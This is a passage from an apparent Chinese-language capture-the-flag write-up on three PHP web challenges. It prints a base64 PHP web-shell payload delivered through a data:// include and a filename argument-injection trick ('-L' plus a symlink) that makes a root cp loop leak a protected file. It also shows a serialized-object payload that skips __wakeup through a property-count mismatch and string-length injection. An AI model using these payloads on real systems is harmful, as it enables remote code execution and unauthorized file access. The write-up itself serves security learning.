## 二、知识点

### 1. `data://` + `substr($file, 25)`

```php
$cmd = trim(<<<'PHP'
<?php @eval($_POST['cmd']); ?>
PHP);

if (base64_decode(substr($file, 25), true) !== $cmd) {
    die("blocked");
}

include $file;
```

`data://text/plain;base64,` 正好 **25 字符**，后面接 `base64($cmd)`：

```text
data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7ID8+
```

- 前 25 位是 wrapper；
- 第 26 位开始是 base64；
- `include` 时 `data://` 解码成 PHP 并执行。

两个编码坑：

- `;` 裸写会被当查询参数分隔符 → `file` 被截断 → `blocked`；必须 `%3B`；
- base64 末尾的 `+` 用 `%2B`，避免变成空格。

### 2. 文件名参数注入：`cp -P *` + `-L`

`/start.sh` 里 root 循环：

```bash
cd /var/www/html/primary
while :; do
    cp -P * /var/www/html/marstream/
    chmod 755 -R /var/www/html/marstream/
    sleep 5
done
```

- `primary` 777，www-data 可写；
- `cp -P` 原本不跟随符号链接；
- `chmod -R` 以 root 执行；
- `*` 没加 `--`，文件名可以当 `cp` 选项。

在 `primary` 里放：

```text
z -> /tmp/flag
-L
```

下一轮变成：

```bash
cp -P -L z /var/www/html/marstream/
```

`-L` 覆盖 `-P`，root 读取 `/tmp/flag`，复制成 `marstream/z`，再 `chmod 755`，www-data 就能读。

关键点：

- 新名字 `z` 避免目标已存在符号链接；
- `touch ./-L` 创建文件名 `-L`，`./` 防止 `touch` 把它当选项；
- `sleep 6~8` 等 root 循环。

### 3. ez_pop：属性数量绕过 `__wakeup`

正常：

```text
解析属性 -> B::__wakeup -> action = null -> A::__destruct
```

链断。

老 PHP 用：

```text
O:1:"B":2:{s:6:"action";O:1:"C":...;}
```

声明 2 个属性、实际 1 个，跳过 `__wakeup`，`action` 保留 C，链跑通。

目标 `Apache/2.4.10 (Debian)` 老 PHP，属性数量版成功；截断版先输出 `唉？你怎么醒了`，失败。

注入点用 `admin -> hacker` 的长度差：

```php
$inject = '";s:4:"sign";' . $b_ser;
$user = str_repeat('admin', strlen($inject)) . $inject;
```

- 注入到 `user`，不能注入 `sign`（A 只认 2 个属性）；
- N 必须等于 `strlen($inject)`；
- F 用空类 `O:1:"F":0:{}`，避免 private 属性名里的 `%00`。

## 三、踩坑

| 坑 | 现象 | 解决 |
|---|---|---|
| `data://` 里的 `;` 裸写 | `blocked` | 用 `%3B` |
| POST body 里 `2>&1` 的 `&` 没编码 | HTTP 500 | 用 `;` 或 `--data-urlencode` |
| `catt` / 读错文件名 | 空白 | 拼写检查；`z` 建的就读 `z` |
| 截断版在目标失败 | `唉？你怎么醒了` | 老 PHP 用属性数量版 |
